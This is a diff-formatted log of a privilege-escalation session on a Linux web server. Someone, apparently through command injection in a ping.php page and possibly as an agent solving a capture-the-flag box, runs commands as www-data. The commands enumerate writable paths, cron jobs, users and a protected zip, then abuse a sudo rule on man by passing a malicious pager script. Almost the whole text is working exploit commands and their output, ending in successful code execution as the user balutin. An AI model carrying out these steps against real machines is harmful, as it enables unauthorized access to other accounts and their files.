@@ -1,0 +1,123 @@
+######## CMD: echo "=== WRITABLE BY www-data (non-trivial) ==="; find / -xdev -writable -type d 2>/dev/null | grep -vE "^/(proc|sys|dev|run|tmp)" | head -20; echo "=== WRITABLE FILES ==="; find / -xdev -writable -type f 2>/dev/null | grep -vE "^/(proc|sys|dev|run|tmp)" | head -20; echo "=== CRON ==="; ls -la /etc/cron* 2>&1 | head -20; cat /etc/crontab 2>&1 | grep -v "^#" | grep -v "^$"; echo "=== www-data home/creds ==="; ls -la /var/www/ 2>&1; echo "=== zip readable by www-data? ==="; ls -la /home/balutin/secretito.zip 2>&1; head -c 16 /home/balutin/secretito.zip 2>&1 | od -c | head -2
+<pre></pre><pre>www-data
+=== WRITABLE BY www-data (non-trivial) ===
+/var/tmp
+/var/lib/php/sessions
+/var/cache/apache2/mod_cache_disk
+=== WRITABLE FILES ===
+=== CRON ===
+/etc/cron.d:
+total 16
+drwxr-xr-x 1 root root 4096 Apr  5  2025 .
+drwxr-xr-x 1 root root 4096 Oct  1 16:23 ..
+-rw-r--r-- 1 root root  201 Mar  5  2023 e2scrub_all
+-rw-r--r-- 1 root root  712 Jul 13  2022 php
+
+/etc/cron.daily:
+total 24
+drwxr-xr-x 1 root root 4096 Apr  5  2025 .
+drwxr-xr-x 1 root root 4096 Oct  1 16:23 ..
+-rwxr-xr-x 1 root root  539 Sep 28  2024 apache2
+-rwxr-xr-x 1 root root 1478 May 25  2023 apt-compat
+-rwxr-xr-x 1 root root  123 Mar 27  2023 dpkg
+-rwxr-xr-x 1 root root 1395 Mar 12  2023 man-db
+
+/etc/cron.weekly:
+total 12
+drwxr-xr-x 2 root root 4096 Apr  5  2025 .
+drwxr-xr-x 1 root root 4096 Oct  1 16:23 ..
+cat: /etc/crontab: No such file or directory
+=== www-data home/creds ===
+total 16
+drwxr-xr-x 3 root root 4096 Apr  5  2025 .
+drwxr-xr-x 1 root root 4096 Apr  5  2025 ..
+drwxr-xr-x 2 root root 4096 Apr  5  2025 html
+=== zip readable by www-data? ===
+ls: cannot access '/home/balutin/secretito.zip': Permission denied
+0000000   h   e   a   d   :       c   a   n   n   o   t       o   p   e
+0000020   n       '   /   h   o   m   e   /   b   a   l   u   t   i   n
+</pre>
+   [http requests used: 2]
+######## CMD: echo "--- sudo VAR=val syntax (needs SETENV) ---"; sudo -u balutin MANPAGER="sh -c \"id > /tmp/bal.txt\"" /usr/bin/man ls > /tmp/o4 2>&1; echo "rc=$?"; cat /tmp/o4; echo "--- did /tmp/bal.txt appear? ---"; ls -la /tmp/bal.txt 2>&1; echo "--- contents ---"; cat /tmp/bal.txt 2>&1
+<pre></pre><pre>www-data
+--- sudo VAR=val syntax (needs SETENV) ---
+rc=1
+sudo: sorry, you are not allowed to set the following environment variables: MANPAGER
+--- did /tmp/bal.txt appear? ---
+ls: cannot access '/tmp/bal.txt': No such file or directory
+--- contents ---
+cat: /tmp/bal.txt: No such file or directory
+</pre>
+   [http requests used: 2]
+######## CMD: echo "=== getcap ==="; getcap -r / 2>/dev/null | head -10; echo "=== users ==="; grep -vE "^#|^$" /etc/passwd; echo "=== shadow readable? ==="; ls -la /etc/shadow 2>&1; echo "=== php module ==="; php -m 2>/dev/null | grep -iE "disable|function" | head -5; echo "=== any other web files ==="; find /var/www -type f 2>/dev/null; echo "=== autoindex ==="; ls -la /etc/apache2/mods-enabled/autoindex.load
+<pre></pre><pre>www-data
+=== getcap ===
+/usr/bin/ping cap_net_raw=ep
+=== users ===
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+balutin:x:1000:1000:balutin,,,:/home/balutin:/bin/bash
+messagebus:x:100:102::/nonexistent:/usr/sbin/nologin
+tcpdump:x:101:103::/nonexistent:/usr/sbin/nologin
+=== shadow readable? ===
+-rw-r----- 1 root shadow 694 Apr  5  2025 /etc/shadow
+=== php module ===
+=== any other web files ===
+/var/www/html/ping.php
+=== autoindex ===
+lrwxrwxrwx 1 root root 32 Apr  5  2025 /etc/apache2/mods-enabled/autoindex.load -> ../mods-available/autoindex.load
+</pre>
+   [http requests used: 2]
+######## CMD: printf "#!/bin/sh\nid > /tmp/pwned.txt\ncat /etc/hostname >> /tmp/pwned.txt\n" > /tmp/p.sh; chmod 755 /tmp/p.sh; rm -f /tmp/pwned.txt; echo "--- test 1: man -P /tmp/p.sh ---"; sudo -u balutin /usr/bin/man -P /tmp/p.sh ls > /dev/null 2>&1; echo "rc=$?"; echo "pwned:"; cat /tmp/pwned.txt 2>&1; echo "--- man pager-related options ---"; man --help 2>&1 | grep -iE "pager|-P|preformat" ; echo "--- man version detail ---"; man -w ls 2>&1 | head -3
+<pre></pre><pre>www-data
+--- test 1: man -P /tmp/p.sh ---
+rc=0
+pwned:
+cat: /tmp/pwned.txt: No such file or directory
+--- man pager-related options ---
+  -w, --where, --path, --location
+  -P, --pager=PAGER          use program PAGER to display output
+  -r, --prompt=STRING        provide the `less' pager with a prompt
+  -p, --preprocessor=STRING  STRING indicates which preprocessors to run:
+--- man version detail ---
+/usr/share/man/man1/ls.1.gz
+</pre>
+   [http requests used: 2]
+######## CMD: for t in script python3 perl socat expect unbuffer; do printf "%-10s " "$t"; command -v $t || echo MISSING; done; echo "--- script version if present ---"; script --version 2>&1 | head -2
+<pre></pre><pre>www-data
+script     /usr/bin/script
+python3    MISSING
+perl       /usr/bin/perl
+socat      MISSING
+expect     MISSING
+unbuffer   MISSING
+--- script version if present ---
+script from util-linux 2.38.1
+</pre>
+   [http requests used: 2]
+######## CMD: rm -f /tmp/pwned.txt; echo "--- exec via pty: script -qec \"sudo -u balutin man -P /tmp/p.sh ls\" ---"; script -qec "sudo -u balutin /usr/bin/man -P /tmp/p.sh ls" /dev/null > /tmp/scr.out 2>&1; echo "rc=$?"; echo "=== OOB: /tmp/pwned.txt ==="; cat /tmp/pwned.txt 2>&1; echo "=== script stdout head ==="; head -c 300 /tmp/scr.out
+<pre></pre><pre>www-data
+--- exec via pty: script -qec "sudo -u balutin man -P /tmp/p.sh ls" ---
+rc=0
+=== OOB: /tmp/pwned.txt ===
+uid=1000(balutin) gid=1000(balutin) groups=1000(balutin),100(users)
+0f38876b0aa7
+=== script stdout head ===
+</pre>
+   [http requests used: 2]
